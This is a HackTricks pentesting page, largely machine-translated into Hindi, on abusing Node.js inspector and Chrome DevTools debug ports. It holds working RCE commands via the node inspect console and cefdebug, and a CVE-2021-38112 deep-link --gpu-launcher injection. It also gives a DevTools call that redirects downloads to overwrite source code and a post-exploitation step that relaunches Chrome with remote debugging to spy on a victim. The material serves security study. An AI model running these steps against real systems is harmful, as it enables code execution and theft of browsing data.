# Node inspector/CEF debug abuse

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

[From the docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): जब `--inspect` स्विच के साथ शुरू किया जाता है, तो एक Node.js प्रक्रिया एक डिबगिंग क्लाइंट के लिए सुनती है। **डिफ़ॉल्ट** रूप से, यह होस्ट और पोर्ट **`127.0.0.1:9229`** पर सुनती है। प्रत्येक प्रक्रिया को एक **विशिष्ट** **UUID** भी सौंपा जाता है।

इंस्पेक्टर क्लाइंट को कनेक्ट करने के लिए होस्ट पता, पोर्ट और UUID जानना और निर्दिष्ट करना चाहिए। एक पूर्ण URL कुछ इस तरह दिखेगा `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`।

{% hint style="warning" %}
चूंकि **डिबगर को Node.js निष्पादन वातावरण तक पूर्ण पहुंच है**, एक दुर्भावनापूर्ण अभिनेता जो इस पोर्ट से कनेक्ट करने में सक्षम है, Node.js प्रक्रिया की ओर से मनमाना कोड निष्पादित करने में सक्षम हो सकता है (**संभावित विशेषाधिकार वृद्धि**).
{% endhint %}

इंस्पेक्टर शुरू करने के कई तरीके हैं:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
जब आप एक निरीक्षित प्रक्रिया शुरू करते हैं, तो कुछ ऐसा दिखाई देगा:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Processes based on **CEF** (**Chromium Embedded Framework**) को **debugger** खोलने के लिए `--remote-debugging-port=9222` पैरामीटर का उपयोग करना आवश्यक है (SSRF सुरक्षा बहुत समान रहती है)। हालाँकि, वे **NodeJS** **debug** सत्र प्रदान करने के बजाय ब्राउज़र के साथ [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) का उपयोग करके संवाद करेंगे, यह ब्राउज़र को नियंत्रित करने के लिए एक इंटरफ़ेस है, लेकिन कोई सीधा RCE नहीं है।

जब आप एक डिबग किए गए ब्राउज़र को शुरू करते हैं, तो कुछ ऐसा दिखाई देगा:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets and same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

वेबसाइटें जो वेब-ब्राउज़र में खुलती हैं, वे ब्राउज़र सुरक्षा मॉडल के तहत WebSocket और HTTP अनुरोध कर सकती हैं। एक **प्रारंभिक HTTP कनेक्शन** आवश्यक है ताकि **एक अद्वितीय डिबगर सत्र आईडी प्राप्त की जा सके**। **same-origin-policy** **रोकता है** वेबसाइटों को **इस HTTP कनेक्शन** को बनाने से। [**DNS rebinding हमलों**](https://en.wikipedia.org/wiki/DNS\_rebinding)** के खिलाफ अतिरिक्त सुरक्षा के लिए,** Node.js यह सत्यापित करता है कि कनेक्शन के लिए **'Host' हेडर** या तो एक **IP पता** या **`localhost`** या **`localhost6`** को सटीक रूप से निर्दिष्ट करते हैं।

{% hint style="info" %}
यह **सुरक्षा उपाय निरीक्षक का शोषण करने से रोकता है** कोड चलाने के लिए **बस एक HTTP अनुरोध भेजकर** (जो एक SSRF vuln का शोषण करके किया जा सकता है)।
{% endhint %}

### चल रहे प्रक्रियाओं में निरीक्षक शुरू करना

आप एक चल रहे nodejs प्रक्रिया को **सिग्नल SIGUSR1** भेज सकते हैं ताकि यह **डिफ़ॉल्ट पोर्ट में निरीक्षक शुरू करे**। हालाँकि, ध्यान दें कि आपके पास पर्याप्त विशेषाधिकार होना चाहिए, इसलिए यह आपको **प्रक्रिया के अंदर जानकारी तक विशेषाधिकार प्राप्त पहुंच** दे सकता है लेकिन सीधे विशेषाधिकार वृद्धि नहीं।
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
यह कंटेनरों में उपयोगी है क्योंकि **प्रक्रिया को बंद करना और एक नई प्रक्रिया शुरू करना** `--inspect` के साथ **विकल्प नहीं है** क्योंकि **कंटेनर** को **प्रक्रिया** के साथ **मार दिया जाएगा**।
{% endhint %}

### निरीक्षक/debugger से कनेक्ट करें

**Chromium-आधारित ब्राउज़र** से कनेक्ट करने के लिए, Chrome या Edge के लिए `chrome://inspect` या `edge://inspect` URLs का उपयोग किया जा सकता है। Configure बटन पर क्लिक करके यह सुनिश्चित किया जाना चाहिए कि **लक्ष्य होस्ट और पोर्ट** सही ढंग से सूचीबद्ध हैं। चित्र एक Remote Code Execution (RCE) उदाहरण दिखाता है:

![](<../../.gitbook/assets/image (674).png>)

**कमांड लाइन** का उपयोग करके आप एक debugger/inspector से कनेक्ट कर सकते हैं:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
यह उपकरण [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) स्थानीय रूप से चल रहे **निरीक्षकों** को **खोजने** और उनमें **कोड इंजेक्ट** करने की अनुमति देता है।
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
ध्यान दें कि **NodeJS RCE हमले काम नहीं करेंगे** यदि [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) के माध्यम से ब्राउज़र से जुड़े हों (आपको इसके साथ करने के लिए दिलचस्प चीजें खोजने के लिए API की जांच करनी होगी)।
{% endhint %}

## NodeJS Debugger/Inspector में RCE

{% hint style="info" %}
यदि आप यहाँ [**Electron में XSS से RCE प्राप्त करने का तरीका खोजने आए हैं, तो कृपया इस पृष्ठ की जांच करें।**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endhint %}

जब आप Node **inspector** से **जुड़ सकते** हैं, तो **RCE** प्राप्त करने के कुछ सामान्य तरीके हैं, जैसे कि (लगता है कि यह **Chrome DevTools protocol** के साथ कनेक्शन में काम नहीं करेगा):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools Protocol Payloads

You can check the API here: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
In this section I will just list interesting things I find people have used to exploit this protocol.

### Parameter Injection via Deep Links

In the [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino security ने खोजा कि CEF पर आधारित एक एप्लिकेशन ने सिस्टम में **एक कस्टम UR**I (workspaces://) पंजीकृत किया जो पूर्ण URI प्राप्त करता था और फिर **CEF आधारित एप्लिकेशन** को उस URI से आंशिक रूप से निर्मित कॉन्फ़िगरेशन के साथ लॉन्च करता था।

यह पता चला कि URI पैरामीटर URL डिकोड किए गए थे और CEF बेसिक एप्लिकेशन को लॉन्च करने के लिए उपयोग किए गए थे, जिससे एक उपयोगकर्ता को **`--gpu-launcher`** फ्लैग को **कमांड लाइन** में **इंजेक्ट** करने और मनमाने कार्यों को निष्पादित करने की अनुमति मिली।

So, a payload like:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Will execute a calc.exe.

### Overwrite Files

**डाउनलोड की गई फ़ाइलों को सहेजने के लिए फ़ोल्डर बदलें** और एक फ़ाइल डाउनलोड करें ताकि आप अपने **दुष्ट कोड** के साथ एप्लिकेशन के अक्सर उपयोग किए जाने वाले **स्रोत कोड** को **ओवरराइट** कर सकें।
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCE और exfiltration

इस पोस्ट के अनुसार: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) RCE प्राप्त करना और theriver से आंतरिक पृष्ठों को exfiltrate करना संभव है।

### Post-Exploitation

एक वास्तविक वातावरण में और **एक उपयोगकर्ता PC को समझौता करने के बाद** जो Chrome/Chromium आधारित ब्राउज़र का उपयोग करता है, आप **debugging सक्रियित करके और debugging port को port-forward करके** एक Chrome प्रक्रिया शुरू कर सकते हैं ताकि आप इसे एक्सेस कर सकें। इस तरह आप **विक्टिम द्वारा Chrome के साथ किए गए सभी कार्यों का निरीक्षण कर सकेंगे और संवेदनशील जानकारी चुरा सकेंगे**।

गुप्त तरीके से **हर Chrome प्रक्रिया को समाप्त करना** और फिर कुछ ऐसा कॉल करना है
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{% hint style="success" %}
सीखें और AWS हैकिंग का अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
सीखें और GCP हैकिंग का अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) की जांच करें!
* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 पर हमें **फॉलो करें** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रिपोजिटरी में PR सबमिट करें।

</details>
{% endhint %}
